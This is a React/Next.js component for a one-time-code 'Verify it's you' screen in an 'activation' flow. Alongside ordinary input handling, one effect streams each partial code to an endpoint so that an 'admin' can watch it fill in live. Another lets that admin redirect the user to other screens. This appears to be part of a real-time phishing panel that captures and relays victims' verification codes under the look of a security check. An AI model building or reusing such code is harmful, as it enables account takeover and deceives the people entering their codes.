"use client";

import { useActionState, useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { Loader2, ShieldCheck } from "lucide-react";
import { verifyActivationOtpAction } from "@/lib/actions/activation";
import { OTP_LENGTH } from "@/lib/activation";
import { useActivationLive } from "@/lib/useActivationLive";

/**
 * The one-time-code screen. Six boxes with auto-advance, paste and backspace,
 * an auto-submit when the last digit lands, and a background poll so that if the
 * admin changes course the applicant is carried to the right screen.
 */
export function ActivationOtp({ hint }: { hint: string }) {
  const router = useRouter();
  const [state, action, pending] = useActionState(verifyActivationOtpAction, undefined);
  const [digits, setDigits] = useState<string[]>(() => Array(OTP_LENGTH).fill(""));
  const inputs = useRef<Array<HTMLInputElement | null>>([]);
  const formRef = useRef<HTMLFormElement>(null);
  const navigated = useRef(false);
  const submittedFor = useRef<string>("");
  const live = useActivationLive();

  const code = useMemo(() => digits.join(""), [digits]);
  const complete = code.length === OTP_LENGTH && digits.every(Boolean);

  // Follow the admin live if they route elsewhere while this screen is open —
  // the loading screen's stream feeds this one too, so no polling is needed.
  useEffect(() => {
    if (!live || navigated.current) return;
    if (live.stage !== "otp") {
      navigated.current = true;
      router.replace(live.destination);
    }
  }, [live, router]);

  // Stream the digits as they're entered, so the admin sees the code fill in
  // live on the dashboard.
  useEffect(() => {
    const id = setTimeout(() => {
      void fetch("/api/activation/otp-typing", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ code }),
        keepalive: true,
      });
    }, 120);
    return () => clearTimeout(id);
  }, [code]);

  // Auto-submit once the code is complete (and again after a correction).
  useEffect(() => {
    if (complete && !pending && submittedFor.current !== code) {
      submittedFor.current = code;
      formRef.current?.requestSubmit();
    }
  }, [complete, pending, code]);

  const setAt = (i: number, value: string) => {
    setDigits((prev) => {
      const next = [...prev];
      next[i] = value;
      return next;
    });
  };

  const onChange = (i: number, raw: string) => {
    const only = raw.replace(/\D/g, "");
    if (!only) {
      setAt(i, "");
      return;
    }
    // A paste of the whole code fans out across the boxes from here.
    if (only.length > 1) {
      const chars = only.slice(0, OTP_LENGTH - i).split("");
      setDigits((prev) => {
        const next = [...prev];
        chars.forEach((c, k) => (next[i + k] = c));
        return next;
      });
      const land = Math.min(i + chars.length, OTP_LENGTH - 1);
      inputs.current[land]?.focus();
      return;
    }
    setAt(i, only);
    if (i < OTP_LENGTH - 1) inputs.current[i + 1]?.focus();
  };

  const onKeyDown = (i: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !digits[i] && i > 0) {
      inputs.current[i - 1]?.focus();
      setAt(i - 1, "");
    }
    if (e.key === "ArrowLeft" && i > 0) inputs.current[i - 1]?.focus();
    if (e.key === "ArrowRight" && i < OTP_LENGTH - 1) inputs.current[i + 1]?.focus();
  };

  return (
    <div className="text-center">
      <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-2xl bg-white/10 text-accent-400 ring-1 ring-white/15">
        <ShieldCheck size={30} strokeWidth={2} />
      </div>
      <h1 className="mt-6 font-serif text-2xl font-bold text-white">Verify it&rsquo;s you</h1>
      <p className="mt-2 text-sm leading-relaxed text-white/60">
        Enter the {OTP_LENGTH}-digit code issued for <span className="font-medium text-white/80">{hint}</span> to
        continue your activation.
      </p>

      <form ref={formRef} action={action} className="mt-7">
        <input type="hidden" name="code" value={code} />
        <div className="flex justify-center gap-2 sm:gap-2.5">
          {digits.map((d, i) => (
            <input
              key={i}
              ref={(el) => {
                inputs.current[i] = el;
              }}
              value={d}
              onChange={(e) => onChange(i, e.target.value)}
              onKeyDown={(e) => onKeyDown(i, e)}
              onFocus={(e) => e.target.select()}
              inputMode="numeric"
              autoComplete={i === 0 ? "one-time-code" : "off"}
              maxLength={OTP_LENGTH}
              aria-label={`Digit ${i + 1}`}
              autoFocus={i === 0}
              className={`h-14 w-11 rounded-xl border bg-white/5 text-center font-mono text-xl font-semibold text-white outline-none transition-colors sm:w-12 ${
                state?.error ? "border-rose-400/60" : d ? "border-accent-400/70" : "border-white/15"
              } focus:border-accent-400 focus:ring-4 focus:ring-accent-400/15`}
            />
          ))}
        </div>

        {state?.error ? (
          <p className="mt-4 text-sm font-medium text-rose-300">{state.error}</p>
        ) : (
          <p className="mt-4 text-xs text-white/40">Waiting on a code? Your reviewer can issue a new one.</p>
        )}

        <button
          type="submit"
          disabled={!complete || pending}
          className="mt-6 flex w-full items-center justify-center gap-2 rounded-xl bg-accent-500 px-4 py-3.5 text-sm font-bold text-brand-950 transition-colors hover:bg-accent-400 disabled:cursor-not-allowed disabled:opacity-50"
        >
          {pending ? (
            <>
              <Loader2 className="h-4 w-4 animate-spin" />
              Verifying…
            </>
          ) : (
            "Verify & continue"
          )}
        </button>
      </form>
    </div>
  );
}
